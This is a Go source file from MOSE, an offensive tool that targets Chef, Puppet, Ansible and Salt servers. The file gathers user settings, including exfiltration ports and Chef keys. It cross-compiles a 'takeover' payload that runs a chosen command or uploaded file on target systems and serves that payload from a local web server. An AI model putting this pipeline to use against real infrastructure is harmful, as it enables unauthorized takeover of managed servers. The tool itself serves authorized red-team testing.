// Copyright 2020 National Technology & Engineering Solutions of Sandia, LLC (NTESS).
// Under the terms of Contract DE-NA0003525 with NTESS,
// the U.S. Government retains certain rights in this software.

package userinput

import (
	"context"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path"
	"path/filepath"
	"strings"
	"text/template"
	"time"

	"github.com/master-of-servers/mose/pkg/moseutils"
	"github.com/master-of-servers/mose/pkg/netutils"
	"github.com/master-of-servers/mose/pkg/system"

	"github.com/rs/zerolog/log"

	"github.com/markbates/pkger"
)

// UserInput holds all values from command line arguments and the settings.json
// This is a necessity resulting from templates needing to take values
// from a single struct, and MOSE taking user input from multiple sources
type UserInput struct {
	// CLI
	OSArch               string `mapstructure:"osarch,omitempty"`
	Cmd                  string `mapstructure:"cmd,omitempty"`
	Debug                bool   `mapstructure:"debug,omitempty"`
	ExfilPort            int    `mapstructure:"exfilport,omitempty"`
	FilePath             string `mapstructure:"filepath,omitempty"`
	FileUpload           string `mapstructure:"fileupload,omitempty"`
	LocalIP              string `mapstructure:"localip,omitempty"`
	PayloadName          string `mapstructure:"payloadname,omitempty"`
	NoServe              bool   `mapstructure:"noserve,omitempty"`
	OSTarget             string `mapstructure:"ostarget,omitempty"`
	WebSrvPort           int    `mapstructure:"websrvport,omitempty"`
	RemoteUploadFilePath string `mapstructure:"remoteuploadpath,omitempty"`
	Rhost                string `mapstructure:"rhost,omitempty"`
	ServeSSL             bool   `mapstructure:"ssl,omitempty"`
	TimeToServe          int    `mapstructure:"tts,omitempty"`
	// Settings
	AnsibleBackupLoc    string `mapstructure:"AnsibleBackupLoc,omitempty"`
	ChefClientKey       string `mapstructure:"ChefClientKey,omitempty"`
	ChefNodeName        string `mapstructure:"ChefNodeName,omitempty"`
	ChefValidationKey   string `mapstructure:"ChefValidationKey,omitempty"`
	CleanupFile         string `mapstructure:"CleanupFile,omitempty"`
	ContainerName       string `mapstructure:"ContainerName,omitempty"`
	ImageName           string `mapstructure:"ImageName,omitempty"`
	PuppetBackupLoc     string `mapstructure:"PuppetBackupLoc,omitempty"`
	RemoteHost          string `mapstructure:"RemoteHost,omitempty"`
	SaltBackupLoc       string `mapstructure:"SaltBackupLoc,omitempty"`
	SSLCertPath         string `mapstructure:"SSLCertPath,omitempty"`
	SSLKeyPath          string `mapstructure:"SSLKeyPath,omitempty"`
	TargetChefServer    string `mapstructure:"TargetChefServer,omitempty"`
	TargetOrgName       string `mapstructure:"TargetOrgName,omitempty"`
	TargetValidatorName string `mapstructure:"TargetValidatorName,omitempty"`
	UploadFilePath      string `mapstructure:"UploadFilePath,omitempty"`
	PayloadDirectory    string `mapstructure:"payloads,omitempty"`

	CMTarget string `mapstructure:"cmtarget,omitempty"`
	BaseDir  string `mapstructure:"basedir,omitempty"`
	NoColor  bool   `mapstructure:"nocolor,omitempty"`
}

// StartTakeover kicks everything off for payload generation
func (i *UserInput) StartTakeover() {
	// Output to the payloads directory if -f is specified
	if i.FileUpload != "" {
		targetBin := filepath.Join(i.PayloadDirectory, i.CMTarget+"-"+strings.ToLower(i.OSTarget))
		files := []string{filepath.Join(i.PayloadDirectory, filepath.Base(i.FileUpload)), targetBin}
		archiveLoc := filepath.Join(i.PayloadDirectory, "files.tar")
		if i.FilePath != "" {
			archiveLoc = i.FilePath
		}

		// Specify tar for the archive type if no extension is defined
		if filepath.Ext(archiveLoc) == "" {
			archiveLoc += ".tar"
		}

		log.Info().Msgf("Compressing files %v into %s", files, archiveLoc)

		loc, err := system.ArchiveFiles(files, archiveLoc)
		if err != nil {
			log.Error().Err(err).Msg("Error generating archive file")
		}
		log.Debug().Msgf("Archive file created at %s", loc)
	}

	// If the user hasn't specified to output the payload to a file, then serve it
	if i.FilePath == "" {
		i.ServePayload()
	}
}

// GenerateParams adds the specified input parameters into the payload
func (i *UserInput) GenerateParams() {
	paramLoc := filepath.Join(i.BaseDir, "cmd/", i.CMTarget, "main/tmpl")

	t, err := parseParamsTemplate(paramLoc)
	if err != nil {
		log.Fatal().Err(err).Msg("")
	}

	if err := writeParamsFile(i, t); err != nil {
		log.Fatal().Err(err).Msg("")
	}
	if err := normalizeFilePath(i); err != nil {
		log.Fatal().Err(err).Msg("")
	}
	normalizeServePort(i)
}

func parseParamsTemplate(paramLoc string) (*template.Template, error) {
	content, err := loadTemplate(filepath.Join("/", paramLoc, "params.tmpl"))
	if err != nil {
		return nil, err
	}
	return template.New("params").Parse(content)
}

func loadTemplate(templatePath string) (string, error) {
	s, err := pkger.Open(templatePath)
	if err != nil {
		return "", err
	}
	dat := new(strings.Builder)
	if _, err := io.Copy(dat, s); err != nil {
		_ = s.Close()
		return "", err
	}
	if err := s.Close(); err != nil {
		return "", err
	}
	return dat.String(), nil
}

func writeParamsFile(i *UserInput, t *template.Template) error {
	paramsPath := filepath.Join(i.BaseDir, "/cmd/", i.CMTarget, "main/params.go")
	f, err := os.Create(paramsPath)
	if err != nil {
		return err
	}
	origFileUpload := i.FileUpload
	if i.FileUpload != "" {
		i.FileUpload = filepath.Base(i.FileUpload)
	}
	defer func() {
		i.FileUpload = origFileUpload
	}()

	if err := t.Execute(f, i); err != nil {
		_ = f.Close()
		return err
	}
	if err := f.Close(); err != nil {
		return err
	}
	return nil
}

func normalizeFilePath(i *UserInput) error {
	dir, _ := path.Split(i.FilePath)

	// Check if dir exists and filePath isn't empty
	if _, err := os.Stat(dir); os.IsNotExist(err) && dir != "" && i.FilePath != "" {
		return fmt.Errorf("location %s does not exist", i.FilePath)
	}

	if dir == "" && i.FilePath != "" {
		wd, err := os.Getwd()
		if err != nil {
			return fmt.Errorf("get working directory: %w", err)
		}
		i.FilePath = filepath.Join(wd, i.FilePath)
	}
	return nil
}

func normalizeServePort(i *UserInput) {
	if !i.ServeSSL && i.WebSrvPort == 443 {
		i.WebSrvPort = 8090
	}
}

// GeneratePayload creates the payload to run on the target system
func (i *UserInput) GeneratePayload() {
	if i.Cmd != "" {
		log.Info().Msgf("Generating %s payload to run %s on a %s system, please wait...", i.CMTarget, i.Cmd, strings.ToLower(i.OSTarget))
	} else {
		log.Info().Msgf("Generating %s payload to run %s on a %s system, please wait...", i.CMTarget, filepath.Base(i.FileUpload), strings.ToLower(i.OSTarget))
	}

	if err := os.MkdirAll(i.PayloadDirectory, 0755); err != nil {
		log.Fatal().Err(err).Msg("Failed to create payload directory")
	}

	payload := filepath.Join(i.PayloadDirectory, i.CMTarget+"-"+strings.ToLower(i.OSTarget))

	log.Debug().Msgf("Payload output name = %s", filepath.Base(payload))
	log.Debug().Msgf("CM Target = %s", i.CMTarget)
	log.Debug().Msgf("OS Target = %s", i.OSTarget)
	if i.FileUpload != "" {
		log.Debug().Msgf("File to upload and run = %s", i.FileUpload)
	}

	// If FileUpload is specified, we need to copy it into place
	if i.FileUpload != "" {
		err := system.CpFile(i.FileUpload, filepath.Join(i.PayloadDirectory, filepath.Base(i.FileUpload)))
		if err != nil {
			log.Fatal().Err(err).Msgf("Failed to copy input file upload (%v) exiting", i.FileUpload)
		}
	}

	// FilePath specified with command to run
	if i.FilePath != "" && i.FileUpload == "" {
		log.Info().Msgf("Creating binary at: %s", i.FilePath)
		payload = i.FilePath
		if !filepath.IsAbs(i.FilePath) {
			payload = filepath.Join(i.BaseDir, i.FilePath)
		}
	}

	// FilePath used as tar output location in conjunction with FileUpload
	if i.FilePath != "" && i.FileUpload != "" {
		log.Info().Msgf("FilePath supplied - the tar file will be created in %s.", i.FilePath)
		log.Info().Msg("File Upload specified - copying payload into the payloads directory.")
		if err := system.CpFile(i.FileUpload, filepath.Join(i.PayloadDirectory, filepath.Base(i.FileUpload))); err != nil {
			log.Fatal().Err(err).Msgf("Failed to copy input file upload (%v) exiting", i.FileUpload)
		}
	}

	cmd := exec.Command("pkger")
	cmd.Dir = filepath.Join(i.BaseDir, "cmd", i.CMTarget, "main")
	err := cmd.Run()
	if err != nil {
		log.Fatal().Err(err).Msg("Error running the command to generate the target payload")
	}

	cmd = exec.Command("env", "GOOS="+strings.ToLower(i.OSTarget), "GOARCH=amd64", "go", "build", "-o", payload)
	log.Debug().Msgf("env GOOS=%s GOARCH=amd64 go build -o %s", strings.ToLower(i.OSTarget), payload)
	cmd.Dir = filepath.Join(i.BaseDir, "cmd", i.CMTarget, "main")
	err = cmd.Run()
	if err != nil {
		log.Fatal().Err(err).Msg("Error running the command to generate the target payload")
	}
}

// SetLocalIP sets the local IP address if specified as an input parameter (-l IPAddress)
func (i *UserInput) SetLocalIP() {
	if i.LocalIP == "" {
		ip, err := netutils.GetLocalIP()
		if err != nil {
			log.Fatal().Err(err).Msg("")
		}
		i.LocalIP = ip
	}
}

// ServePayload will serve the payload with a web server
func (i *UserInput) ServePayload() {
	proto := "http"
	if i.ServeSSL {
		proto = "https"
	}

	if i.FileUpload != "" {
		moseutils.ColorMsgf("File upload command specified, payload being served at %s://%s:%d/files.tar for %d seconds", proto, i.LocalIP, i.WebSrvPort, i.TimeToServe)
	} else {
		moseutils.ColorMsgf("Payload being served at %s://%s:%d/%s-%s for %d seconds", proto, i.LocalIP, i.WebSrvPort, i.CMTarget, strings.ToLower(i.OSTarget), i.TimeToServe)
	}

	srv := netutils.StartServer(i.WebSrvPort, i.PayloadDirectory, i.ServeSSL, i.SSLCertPath, i.SSLKeyPath, time.Duration(i.TimeToServe)*time.Second, true)

	log.Info().Msg("Web server shutting down...")

	if err := srv.Shutdown(context.Background()); err != nil {
		log.Fatal().Err(err).Msg("")
	}
}
